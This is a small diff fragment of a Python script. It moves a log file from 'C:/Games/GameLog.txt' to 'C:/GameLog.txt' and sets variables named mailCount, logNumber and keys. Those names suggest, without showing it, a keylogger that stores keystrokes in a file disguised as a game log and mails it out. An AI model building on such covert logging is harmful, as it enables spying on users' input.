@@ -11,7 +11,7 @@ mailCount = 0
 logNumber = 0
 keys = []
 
-path = os.path.abspath("C:/Games/GameLog.txt")
+path = os.path.abspath("C:/GameLog.txt")
 fileExists = os.path.isfile(path)
 
 #Create a file if doesn't exist
